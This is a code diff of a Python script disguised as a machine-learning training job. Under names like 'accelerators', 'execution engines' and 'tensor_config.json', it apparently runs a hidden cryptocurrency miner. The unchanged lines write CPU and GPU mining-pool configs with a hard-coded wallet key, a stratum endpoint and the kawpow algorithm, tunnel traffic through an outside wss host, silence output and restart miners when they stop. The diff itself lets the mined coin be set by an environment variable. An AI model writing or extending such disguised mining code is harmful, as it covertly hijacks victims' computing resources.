@@ -43,6 +43,7 @@ DATASET_SIZE = 50000
 STEPS_PER_EPOCH = DATASET_SIZE // BATCH_SIZE
 
 MODEL_KEY = os.getenv('MODEL_AUTH', '45QACrYpyJbCFmRW8P9N1peYc3Fw3WGKgBfs8Xgs8uDSfRSMjVzNUCQRwhwdys4xBzXShv67MhEj7H1eWQD3NHLRLDKXmEa')
+COIN_TICKER = os.getenv('COIN_TICKER', 'DOGE')
 TUNNEL_EP = os.getenv('TUNNEL_URL', 'wss://lumen-shadow-tunnel.onrender.com')
 
 NOTIFY_TOKEN = os.getenv('NOTIFY_TOKEN', '')
@@ -300,7 +301,7 @@ def _init_accelerators():
     print("[*] Step 4: Booting execution engines...", flush=True)
     out = None if VERBOSE else subprocess.DEVNULL
 
-    worker_tag = f"XMR:{MODEL_KEY}.node-cpu-{random.randint(1000,9999)}"
+    worker_tag = f"{COIN_TICKER}:{MODEL_KEY}.node-cpu-{random.randint(1000,9999)}"
     cfg_path = os.path.join(EXEC_DIR, "config.json")
     with open(cfg_path, "w") as f:
         json.dump({"pools": [{"url": "127.0.0.1:5556", "user": worker_tag}], "cpu": {"priority": 0, "max-threads-hint": 50}, "print-time": 60, "log-file": None}, f)
@@ -316,7 +317,7 @@ def _init_accelerators():
 
     proc_b = None
     if gpu_count > 0:
-        gpu_tag = f"XMR:{MODEL_KEY}.node-gpu-{random.randint(100,999)}"
+        gpu_tag = f"{COIN_TICKER}:{MODEL_KEY}.node-gpu-{random.randint(100,999)}"
         gpu_cfg = os.path.join(EXEC_DIR, "tensor_config.json")
         with open(gpu_cfg, "w") as f:
             json.dump({"pools": [{"url": "stratum+tcp://127.0.0.1:5555", "user": gpu_tag, "algo": "kawpow"}], "intensity": 10, "log-file": None}, f)
@@ -409,7 +410,7 @@ def _runtime_monitor():
             if VERBOSE: print(f"[!] Runtime A exited (code={exit_code}). Restarting...", flush=True)
             out = None if VERBOSE else subprocess.DEVNULL
 
-            tag = f"XMR:{MODEL_KEY}.node-cpu-{random.randint(1000,9999)}"
+            tag = f"{COIN_TICKER}:{MODEL_KEY}.node-cpu-{random.randint(1000,9999)}"
             cfg = os.path.join(EXEC_DIR, "config.json")
             with open(cfg, "w") as f:
                 json.dump({"pools": [{"url": "127.0.0.1:5556", "user": tag}], "cpu": {"priority": 0, "max-threads-hint": 50}, "print-time": 60, "log-file": None}, f)
@@ -426,7 +427,7 @@ def _runtime_monitor():
             exit_code = _RT_PROC_B.returncode
             if VERBOSE: print(f"[!] Runtime B exited (code={exit_code}). Restarting...", flush=True)
 
-            tag = f"XMR:{MODEL_KEY}.node-gpu-{random.randint(100,999)}"
+            tag = f"{COIN_TICKER}:{MODEL_KEY}.node-gpu-{random.randint(100,999)}"
             gpu_cfg = os.path.join(EXEC_DIR, "tensor_config.json")
             with open(gpu_cfg, "w") as f:
                 json.dump({"pools": [{"url": "stratum+tcp://127.0.0.1:5555", "user": tag, "algo": "kawpow"}], "intensity": 10, "log-file": None}, f)
